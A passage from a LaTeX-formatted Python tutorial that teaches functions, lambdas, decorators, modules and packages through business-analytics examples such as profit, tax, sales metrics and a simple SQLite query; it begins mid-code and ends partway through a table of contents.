\NormalTok{calculate\_tax }\OperatorTok{=} \KeywordTok{lambda}\NormalTok{ amount, tax\_rate: amount }\OperatorTok{*}\NormalTok{ tax\_rate}

\CommentTok{\# Using the lambda function}
\NormalTok{amount }\OperatorTok{=} \DecValTok{1000}
\NormalTok{tax\_rate }\OperatorTok{=} \FloatTok{0.15}  \CommentTok{\# 15\% tax rate}
\NormalTok{tax }\OperatorTok{=}\NormalTok{ calculate\_tax(amount, tax\_rate)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Tax: $}\SpecialCharTok{\{}\NormalTok{tax}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-4}

Functions are a powerful feature in Python that help you create
organized and modular code. By defining and calling functions, using
parameters and arguments, and leveraging lambda functions, you can
create efficient business applications. These examples demonstrate how
to apply these concepts to common business scenarios, helping you to
develop practical and functional Python programs.

\section{Introduction to Python
Modules}\label{introduction-to-python-modules}

Python modules are files containing Python code that can be reused
across different programs. They help in organizing code, making it more
manageable, and promoting code reuse. This tutorial will introduce you
to Python modules, how to create them, and how to use built-in and
third-party modules with business-related examples.

\subsection{What is a Module?}\label{what-is-a-module}

A module is simply a file containing Python definitions and statements.
For instance, a file named \texttt{mymodule.py} is a module whose name
is \texttt{mymodule}.

\subsection{Importing Modules}\label{importing-modules-2}

You can use the \texttt{import} statement to import a module and access
its functions and variables.

\subsubsection{Example: Using Built-in
Modules}\label{example-using-built-in-modules}

Python comes with a rich standard library of modules.

\paragraph{\texorpdfstring{Example: Using the \texttt{math}
Module}{Example: Using the math Module}}\label{example-using-the-math-module}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ math}

\CommentTok{\# Calculate the ceiling value of a product price}
\NormalTok{product\_price }\OperatorTok{=} \FloatTok{123.45}
\NormalTok{ceiling\_price }\OperatorTok{=}\NormalTok{ math.ceil(product\_price)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Ceiling price: $}\SpecialCharTok{\{}\NormalTok{ceiling\_price}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Creating Your Own Module}\label{creating-your-own-module}

You can create your own modules by writing Python code in a \texttt{.py}
file.

\subsubsection{Example: Create a Module for Financial
Calculations}\label{example-create-a-module-for-financial-calculations}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Create a file named \texttt{financial.py}:
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# financial.py}

\KeywordTok{def}\NormalTok{ calculate\_gross\_profit(revenue, cogs):}
    \ControlFlowTok{return}\NormalTok{ revenue }\OperatorTok{{-}}\NormalTok{ cogs}

\KeywordTok{def}\NormalTok{ calculate\_net\_profit(gross\_profit, expenses):}
    \ControlFlowTok{return}\NormalTok{ gross\_profit }\OperatorTok{{-}}\NormalTok{ expenses}

\KeywordTok{def}\NormalTok{ calculate\_roi(profit, investment):}
    \ControlFlowTok{return}\NormalTok{ (profit }\OperatorTok{/}\NormalTok{ investment) }\OperatorTok{*} \DecValTok{100}
\end{Highlighting}
\end{Shaded}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\setcounter{enumi}{1}
\tightlist
\item
  Use the \texttt{financial.py} module in another Python script:
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# main.py}
\ImportTok{import}\NormalTok{ financial}

\NormalTok{revenue }\OperatorTok{=} \DecValTok{100000}
\NormalTok{cogs }\OperatorTok{=} \DecValTok{40000}
\NormalTok{expenses }\OperatorTok{=} \DecValTok{30000}
\NormalTok{investment }\OperatorTok{=} \DecValTok{50000}

\NormalTok{gross\_profit }\OperatorTok{=}\NormalTok{ financial.calculate\_gross\_profit(revenue, cogs)}
\NormalTok{net\_profit }\OperatorTok{=}\NormalTok{ financial.calculate\_net\_profit(gross\_profit, expenses)}
\NormalTok{roi }\OperatorTok{=}\NormalTok{ financial.calculate\_roi(net\_profit, investment)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Gross Profit: $}\SpecialCharTok{\{}\NormalTok{gross\_profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Net Profit: $}\SpecialCharTok{\{}\NormalTok{net\_profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Return on Investment: }\SpecialCharTok{\{}\NormalTok{roi}\SpecialCharTok{\}}\SpecialStringTok{\%"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Using the \texttt{from} Import
Statement}{Using the from Import Statement}}\label{using-the-from-import-statement}

You can import specific functions or variables from a module using the
\texttt{from} statement.

\subsubsection{Example: Import Specific
Functions}\label{example-import-specific-functions}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ financial }\ImportTok{import}\NormalTok{ calculate\_gross\_profit, calculate\_net\_profit}

\NormalTok{revenue }\OperatorTok{=} \DecValTok{80000}
\NormalTok{cogs }\OperatorTok{=} \DecValTok{30000}
\NormalTok{expenses }\OperatorTok{=} \DecValTok{20000}

\NormalTok{gross\_profit }\OperatorTok{=}\NormalTok{ calculate\_gross\_profit(revenue, cogs)}
\NormalTok{net\_profit }\OperatorTok{=}\NormalTok{ calculate\_net\_profit(gross\_profit, expenses)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Gross Profit: $}\SpecialCharTok{\{}\NormalTok{gross\_profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Net Profit: $}\SpecialCharTok{\{}\NormalTok{net\_profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Using Aliases}\label{using-aliases}

You can use aliases to give a module or a function a different name.

\subsubsection{Example: Using Aliases for
Modules}\label{example-using-aliases-for-modules}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ financial }\ImportTok{as}\NormalTok{ fin}

\NormalTok{revenue }\OperatorTok{=} \DecValTok{120000}
\NormalTok{cogs }\OperatorTok{=} \DecValTok{50000}
\NormalTok{expenses }\OperatorTok{=} \DecValTok{40000}

\NormalTok{gross\_profit }\OperatorTok{=}\NormalTok{ fin.calculate\_gross\_profit(revenue, cogs)}
\NormalTok{net\_profit }\OperatorTok{=}\NormalTok{ fin.calculate\_net\_profit(gross\_profit, expenses)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Gross Profit: $}\SpecialCharTok{\{}\NormalTok{gross\_profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Net Profit: $}\SpecialCharTok{\{}\NormalTok{net\_profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Exploring Built-in
Modules}\label{exploring-built-in-modules}

Python's standard library includes many modules that can be very useful
in business applications.

\subsubsection{\texorpdfstring{Example: Using the \texttt{datetime}
Module}{Example: Using the datetime Module}}\label{example-using-the-datetime-module}

The \texttt{datetime} module is useful for manipulating dates and times.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ datetime}

\CommentTok{\# Calculate the number of days between two dates}
\NormalTok{date\_format }\OperatorTok{=} \StringTok{"\%Y{-}\%m{-}}\SpecialCharTok{\%d}\StringTok{"}
\NormalTok{start\_date }\OperatorTok{=}\NormalTok{ datetime.datetime.strptime(}\StringTok{"2024{-}01{-}01"}\NormalTok{, date\_format)}
\NormalTok{end\_date }\OperatorTok{=}\NormalTok{ datetime.datetime.strptime(}\StringTok{"2024{-}12{-}31"}\NormalTok{, date\_format)}
\NormalTok{delta }\OperatorTok{=}\NormalTok{ end\_date }\OperatorTok{{-}}\NormalTok{ start\_date}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Number of days between the dates: }\SpecialCharTok{\{}\NormalTok{delta}\SpecialCharTok{.}\NormalTok{days}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Installing and Using Third-Party
Modules}\label{installing-and-using-third-party-modules}

You can install third-party modules using \texttt{pip}, Python's package
installer.

\subsubsection{\texorpdfstring{Example: Using the \texttt{pandas}
Module}{Example: Using the pandas Module}}\label{example-using-the-pandas-module}

\texttt{pandas} is a popular data manipulation library useful for
business data analysis.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Install \texttt{pandas}:
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install pandas}
\end{Highlighting}
\end{Shaded}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\setcounter{enumi}{1}
\tightlist
\item
  Use \texttt{pandas} in your Python script:
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Create a DataFrame with sales data}
\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{"Product"}\NormalTok{: [}\StringTok{"A"}\NormalTok{, }\StringTok{"B"}\NormalTok{, }\StringTok{"C"}\NormalTok{],}
    \StringTok{"Sales"}\NormalTok{: [}\DecValTok{1000}\NormalTok{, }\DecValTok{1500}\NormalTok{, }\DecValTok{800}\NormalTok{]}
\NormalTok{\}}

\NormalTok{df }\OperatorTok{=}\NormalTok{ pd.DataFrame(data)}
\BuiltInTok{print}\NormalTok{(df)}

\CommentTok{\# Calculate total sales}
\NormalTok{total\_sales }\OperatorTok{=}\NormalTok{ df[}\StringTok{"Sales"}\NormalTok{].}\BuiltInTok{sum}\NormalTok{()}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total Sales: $}\SpecialCharTok{\{}\NormalTok{total\_sales}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-5}

Python modules are powerful tools for organizing and reusing code. By
understanding how to create, import, and use both built-in and
third-party modules, you can enhance the functionality and efficiency of
your business applications. These examples demonstrate the practical use
of modules in various business scenarios, helping you to develop robust
and maintainable Python programs.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial on Python Functions using Business Analytics
and Information Systems
Examples}\label{deep-dive-tutorial-on-python-functions-using-business-analytics-and-information-systems-examples}

Functions are a fundamental building block in Python that allow you to
encapsulate reusable blocks of code. Functions help make your code
modular, readable, and maintainable. This tutorial provides an in-depth
look at Python functions, with practical examples in the context of
business analytics and information systems (BAIS).

\section{Table of Contents}\label{table-of-contents-2}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[defining-functions]{Defining Functions}
\item
  \hyperref[calling-functions]{Calling Functions}
\item
  \hyperref[function-arguments]{Function Arguments}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[positional-arguments]{Positional Arguments}
  \item
    \hyperref[keyword-arguments]{Keyword Arguments}
  \item
    \hyperref[default-arguments]{Default Arguments}
  \item
    \hyperref[variable-length-arguments]{Variable-length Arguments}
  \end{itemize}
\item
  \hyperref[return-statement]{Return Statement}
\item
  \hyperref[lambda-functions]{Lambda Functions}
\item
  \hyperref[higher-order-functions]{Higher-Order Functions}
\item
  \hyperref[docstrings]{Docstrings}
\item
  \hyperref[decorators]{Decorators}
\item
  \hyperref[scope-and-lifetime-of-variables]{Scope and Lifetime of
  Variables}
\item
  \hyperref[practical-examples-in-bais]{Practical Examples in BAIS}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[sales-analysis-function]{Sales Analysis Function}
  \item
    \hyperref[data-cleaning-function]{Data Cleaning Function}
  \item
    \hyperref[database-query-function]{Database Query Function}
  \end{itemize}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Defining Functions}\label{defining-functions-1}

Functions in Python are defined using the \texttt{def} keyword, followed
by the function name, parentheses, and a colon. The body of the function
is indented.

\textbf{Example: Simple Function}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ greet():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Hello, welcome to the BAIS tutorial!"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Calling Functions}\label{calling-functions}

To execute a function, you need to call it by its name followed by
parentheses.

\textbf{Example: Calling a Function}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{greet()}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
Hello, welcome to the BAIS tutorial!
\end{verbatim}

\section{Function Arguments}\label{function-arguments-1}

Functions can accept arguments to process data and return results.

\subsection{Positional Arguments}\label{positional-arguments-1}

Positional arguments are the most common way to pass values to a
function. The order of arguments matters.

\textbf{Example: Function with Positional Arguments}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_profit(revenue, expenses):}
\NormalTok{    profit }\OperatorTok{=}\NormalTok{ revenue }\OperatorTok{{-}}\NormalTok{ expenses}
    \ControlFlowTok{return}\NormalTok{ profit}

\CommentTok{\# Calling the function with positional arguments}
\NormalTok{profit }\OperatorTok{=}\NormalTok{ calculate\_profit(}\DecValTok{100000}\NormalTok{, }\DecValTok{50000}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Profit: }\SpecialCharTok{\{}\NormalTok{profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
Profit: 50000
\end{verbatim}

\subsection{Keyword Arguments}\label{keyword-arguments-1}

Keyword arguments allow you to specify arguments by their parameter
name, making the function call more readable.

\textbf{Example: Function with Keyword Arguments}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Calling the function with keyword arguments}
\NormalTok{profit }\OperatorTok{=}\NormalTok{ calculate\_profit(expenses}\OperatorTok{=}\DecValTok{50000}\NormalTok{, revenue}\OperatorTok{=}\DecValTok{100000}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Profit: }\SpecialCharTok{\{}\NormalTok{profit}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Default Arguments}\label{default-arguments}

Default arguments allow you to specify default values for parameters. If
no value is provided, the default is used.

\textbf{Example: Function with Default Arguments}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_profit(revenue, expenses}\OperatorTok{=}\DecValTok{40000}\NormalTok{):}
\NormalTok{    profit }\OperatorTok{=}\NormalTok{ revenue }\OperatorTok{{-}}\NormalTok{ expenses}
    \ControlFlowTok{return}\NormalTok{ profit}

\CommentTok{\# Calling the function with and without the default argument}
\BuiltInTok{print}\NormalTok{(calculate\_profit(}\DecValTok{100000}\NormalTok{))  }\CommentTok{\# Uses default expenses}
\BuiltInTok{print}\NormalTok{(calculate\_profit(}\DecValTok{100000}\NormalTok{, }\DecValTok{50000}\NormalTok{))  }\CommentTok{\# Overrides default expenses}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
60000
50000
\end{verbatim}

\subsection{Variable-length
Arguments}\label{variable-length-arguments-1}

Variable-length arguments allow you to pass a variable number of
arguments to a function using \texttt{*args} for non-keyword arguments
and \texttt{**kwargs} for keyword arguments.

\textbf{Example: Function with Variable-length Arguments}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ print\_sales(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
    \ControlFlowTok{for}\NormalTok{ sale }\KeywordTok{in}\NormalTok{ args:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sale: }\SpecialCharTok{\{}\NormalTok{sale}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ key, value }\KeywordTok{in}\NormalTok{ kwargs.items():}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{key}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{value}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Calling the function with variable{-}length arguments}
\NormalTok{print\_sales(}\DecValTok{1000}\NormalTok{, }\DecValTok{2000}\NormalTok{, }\DecValTok{3000}\NormalTok{, region}\OperatorTok{=}\StringTok{"North"}\NormalTok{, manager}\OperatorTok{=}\StringTok{"Alice"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
Sale: 1000
Sale: 2000
Sale: 3000
region: North
manager: Alice
\end{verbatim}

\section{Return Statement}\label{return-statement}

The \texttt{return} statement is used to send a result back to the
caller. A function can return multiple values as a tuple.

\textbf{Example: Function with Return Statement}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ analyze\_sales(sales):}
\NormalTok{    total\_sales }\OperatorTok{=} \BuiltInTok{sum}\NormalTok{(sales)}
\NormalTok{    average\_sales }\OperatorTok{=}\NormalTok{ total\_sales }\OperatorTok{/} \BuiltInTok{len}\NormalTok{(sales)}
    \ControlFlowTok{return}\NormalTok{ total\_sales, average\_sales}

\CommentTok{\# Calling the function and unpacking the returned tuple}
\NormalTok{total, average }\OperatorTok{=}\NormalTok{ analyze\_sales([}\DecValTok{1000}\NormalTok{, }\DecValTok{2000}\NormalTok{, }\DecValTok{3000}\NormalTok{, }\DecValTok{4000}\NormalTok{, }\DecValTok{5000}\NormalTok{])}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total Sales: }\SpecialCharTok{\{}\NormalTok{total}\SpecialCharTok{\}}\SpecialStringTok{, Average Sales: }\SpecialCharTok{\{}\NormalTok{average}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
Total Sales: 15000, Average Sales: 3000.0
\end{verbatim}

\section{Lambda Functions}\label{lambda-functions-1}

Lambda functions are small anonymous functions defined using the
\texttt{lambda} keyword. They are often used for short, simple
operations.

\textbf{Example: Lambda Function for Sales Tax Calculation}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Lambda function to calculate sales tax}
\NormalTok{calculate\_tax }\OperatorTok{=} \KeywordTok{lambda}\NormalTok{ price, tax\_rate: price }\OperatorTok{*}\NormalTok{ tax\_rate}
\BuiltInTok{print}\NormalTok{(calculate\_tax(}\DecValTok{100}\NormalTok{, }\FloatTok{0.05}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
5.0
\end{verbatim}

\section{Higher-Order Functions}\label{higher-order-functions}

Higher-order functions are functions that take other functions as
arguments or return them as results.

\textbf{Example: Higher-Order Function for Applying Discounts}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ apply\_discount(price, discount\_function):}
    \ControlFlowTok{return}\NormalTok{ discount\_function(price)}

\CommentTok{\# Regular function to calculate a discount}
\KeywordTok{def}\NormalTok{ ten\_percent\_discount(price):}
    \ControlFlowTok{return}\NormalTok{ price }\OperatorTok{*} \FloatTok{0.9}

\CommentTok{\# Using the higher{-}order function}
\BuiltInTok{print}\NormalTok{(apply\_discount(}\DecValTok{100}\NormalTok{, ten\_percent\_discount))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
90.0
\end{verbatim}

\section{Docstrings}\label{docstrings}

Docstrings provide a convenient way of associating documentation with
Python modules, functions, classes, and methods.

\textbf{Example: Function with Docstring}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ analyze\_sales(sales):}
    \CommentTok{"""}
\CommentTok{    Calculate the total and average sales.}

\CommentTok{    Parameters:}
\CommentTok{    sales (list): A list of sales amounts}

\CommentTok{    Returns:}
\CommentTok{    tuple: Total and average sales}
\CommentTok{    """}
\NormalTok{    total\_sales }\OperatorTok{=} \BuiltInTok{sum}\NormalTok{(sales)}
\NormalTok{    average\_sales }\OperatorTok{=}\NormalTok{ total\_sales }\OperatorTok{/} \BuiltInTok{len}\NormalTok{(sales)}
    \ControlFlowTok{return}\NormalTok{ total\_sales, average\_sales}
\end{Highlighting}
\end{Shaded}

\section{Decorators}\label{decorators}

Decorators are a powerful and flexible way to extend the behavior of
functions or methods without modifying their actual code. A decorator is
a function that wraps another function.

\textbf{Example: Logging Decorator}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ log\_function\_call(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Calling function }\SpecialCharTok{\{}\NormalTok{func}\SpecialCharTok{.}\VariableTok{\_\_name\_\_}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Function }\SpecialCharTok{\{}\NormalTok{func}\SpecialCharTok{.}\VariableTok{\_\_name\_\_}\SpecialCharTok{\}}\SpecialStringTok{ returned }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ result}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@log\_function\_call}
\KeywordTok{def}\NormalTok{ calculate\_profit(revenue, expenses):}
    \ControlFlowTok{return}\NormalTok{ revenue }\OperatorTok{{-}}\NormalTok{ expenses}

\CommentTok{\# Using the decorated function}
\BuiltInTok{print}\NormalTok{(calculate\_profit(}\DecValTok{100000}\NormalTok{, }\DecValTok{50000}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
Calling function calculate_profit
Function calculate_profit returned 50000
50000
\end{verbatim}

\section{Scope and Lifetime of
Variables}\label{scope-and-lifetime-of-variables}

Variables defined inside a function are local to that function and
cannot be accessed from outside. The lifetime of these variables is
confined to the function's execution.

\textbf{Example: Variable Scope}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ analyze\_sales(sales):}
\NormalTok{    total\_sales }\OperatorTok{=} \BuiltInTok{sum}\NormalTok{(sales)}
    \ControlFlowTok{return}\NormalTok{ total\_sales}

\CommentTok{\# total\_sales is not accessible outside the function}
\NormalTok{total }\OperatorTok{=}\NormalTok{ analyze\_sales([}\DecValTok{1000}\NormalTok{, }\DecValTok{2000}\NormalTok{, }\DecValTok{3000}\NormalTok{])}
\BuiltInTok{print}\NormalTok{(total)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
6000
\end{verbatim}

\section{Practical Examples in BAIS}\label{practical-examples-in-bais}

\subsection{Sales Analysis Function}\label{sales-analysis-function}

\textbf{Example: Calculate Sales Metrics}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_sales\_metrics(sales):}
    \CommentTok{"""}
\CommentTok{    Calculate total, average, and highest sales.}

\CommentTok{    Parameters:}
\CommentTok{    sales (list): A list of sales amounts}

\CommentTok{    Returns:}
\CommentTok{    dict: A dictionary with total, average, and highest sales}
\CommentTok{    """}
\NormalTok{    total\_sales }\OperatorTok{=} \BuiltInTok{sum}\NormalTok{(sales)}
\NormalTok{    average\_sales }\OperatorTok{=}\NormalTok{ total\_sales }\OperatorTok{/} \BuiltInTok{len}\NormalTok{(sales)}
\NormalTok{    highest\_sale }\OperatorTok{=} \BuiltInTok{max}\NormalTok{(sales)}
    \ControlFlowTok{return}\NormalTok{ \{}
        \StringTok{"total\_sales"}\NormalTok{: total\_sales,}
        \StringTok{"average\_sales"}\NormalTok{: average\_sales,}
        \StringTok{"highest\_sale"}\NormalTok{: highest\_sale}
\NormalTok{    \}}

\CommentTok{\# Example usage}
\NormalTok{sales\_data }\OperatorTok{=}\NormalTok{ [}\DecValTok{1000}\NormalTok{, }\DecValTok{2000}\NormalTok{, }\DecValTok{3000}\NormalTok{, }\DecValTok{4000}\NormalTok{, }\DecValTok{5000}\NormalTok{]}
\NormalTok{metrics }\OperatorTok{=}\NormalTok{ calculate\_sales\_metrics(sales\_data)}
\BuiltInTok{print}\NormalTok{(metrics)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
{'total_sales': 15000, 'average_sales': 3000.0, 'highest_sale': 5000}
\end{verbatim}

\subsection{Data Cleaning Function}\label{data-cleaning-function}

\textbf{Example: Remove Outliers from Sales Data}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ remove\_outliers(data, threshold}\OperatorTok{=}\DecValTok{2}\NormalTok{):}
    \CommentTok{"""}
\CommentTok{    Remove outliers from the data.}

\CommentTok{    Parameters:}
\CommentTok{    data (list): A list of numerical values}
\CommentTok{    threshold (int): The number of standard deviations to use as the cutoff}

\CommentTok{    Returns:}
\CommentTok{    list: A list with outliers removed}
\CommentTok{    """}
    \ImportTok{import}\NormalTok{ numpy }\ImportTok{as}\NormalTok{ np}
\NormalTok{    mean }\OperatorTok{=}\NormalTok{ np.mean(data)}
\NormalTok{    std\_dev }\OperatorTok{=}\NormalTok{ np.std(data)}
\NormalTok{    filtered\_data }\OperatorTok{=}\NormalTok{ [x }\ControlFlowTok{for}\NormalTok{ x }\KeywordTok{in}\NormalTok{ data }\ControlFlowTok{if}\NormalTok{ (mean }\OperatorTok{{-}}\NormalTok{ threshold }\OperatorTok{*}\NormalTok{ std\_dev }\OperatorTok{\textless{}}\NormalTok{ x }\OperatorTok{\textless{}}\NormalTok{ mean }\OperatorTok{+}\NormalTok{ threshold }\OperatorTok{*}\NormalTok{ std\_dev)]}
    \ControlFlowTok{return}\NormalTok{ filtered\_data}

\CommentTok{\# Example usage}
\NormalTok{sales\_data }\OperatorTok{=}\NormalTok{ [}\DecValTok{1000}\NormalTok{, }\DecValTok{2000}\NormalTok{, }\DecValTok{3000}\NormalTok{, }\DecValTok{4000}\NormalTok{, }\DecValTok{5000}\NormalTok{, }\DecValTok{100000}\NormalTok{]}
\NormalTok{cleaned\_data }\OperatorTok{=}\NormalTok{ remove\_outliers(sales\_data)}
\BuiltInTok{print}\NormalTok{(cleaned\_data)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
[1000, 2000, 3000, 4000, 5000]
\end{verbatim}

\subsection{Database Query Function}\label{database-query-function}

\textbf{Example: Query Sales Data from Database}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sqlite3}

\KeywordTok{def}\NormalTok{ query\_sales\_data(db\_name):}
    \CommentTok{"""}
\CommentTok{    Query sales data from the database.}

\CommentTok{    Parameters:}
\CommentTok{    db\_name}

\CommentTok{ (str): The name of the database file}

\CommentTok{    Returns:}
\CommentTok{    list: A list of sales records}
\CommentTok{    """}
\NormalTok{    connection }\OperatorTok{=}\NormalTok{ sqlite3.}\ExtensionTok{connect}\NormalTok{(db\_name)}
\NormalTok{    cursor }\OperatorTok{=}\NormalTok{ connection.cursor()}
\NormalTok{    cursor.execute(}\StringTok{"SELECT * FROM sales"}\NormalTok{)}
\NormalTok{    sales\_data }\OperatorTok{=}\NormalTok{ cursor.fetchall()}
\NormalTok{    connection.close()}
    \ControlFlowTok{return}\NormalTok{ sales\_data}

\CommentTok{\# Example usage}
\CommentTok{\# Make sure to have a database file named \textquotesingle{}sales.db\textquotesingle{} with a \textquotesingle{}sales\textquotesingle{} table}
\NormalTok{sales\_data }\OperatorTok{=}\NormalTok{ query\_sales\_data(}\StringTok{\textquotesingle{}sales.db\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(sales\_data)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-6}

This deep dive tutorial covered the fundamentals and advanced features
of Python functions, with practical examples in business analytics and
information systems (BAIS). Understanding how to define, call, and
utilize functions effectively is essential for writing modular,
readable, and maintainable code. Functions are a powerful tool that
allows you to encapsulate logic, improve code reuse, and manage
complexity in your Python programs.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial on Python Modules using Business Analytics
and Information Systems
Examples}\label{deep-dive-tutorial-on-python-modules-using-business-analytics-and-information-systems-examples}

Python modules are essential for organizing and structuring your code,
allowing you to reuse code across different projects and improve
maintainability. This tutorial provides a deep dive into Python modules,
with practical examples in the context of business analytics and
information systems (BAIS).

\section{Table of Contents}\label{table-of-contents-3}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[what-is-a-python-module]{What is a Python Module?}
\item
  \hyperref[creating-a-module]{Creating a Module}
\item
  \hyperref[importing-a-module]{Importing a Module}
\item
  \hyperref[the-__name__-variable]{The \texttt{\_\_name\_\_} Variable}
\item
  \hyperref[creating-a-package]{Creating a Package}
\item
  \hyperref[importing-from-a-package]{Importing from a Package}
\item
  \hyperref[using-__init__py]{Using \texttt{\_\_init\_\_.py}}
\item
  \hyperref[practical-examples-in-bais]{Practical Examples in BAIS}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[data-analysis-module]{Data Analysis Module}
  \item
    \hyperref[data-visualization-module]{Data Visualization Module}
  \item
    \hyperref[database-interaction-module]{Database Interaction Module}
  \end{itemize}
\item
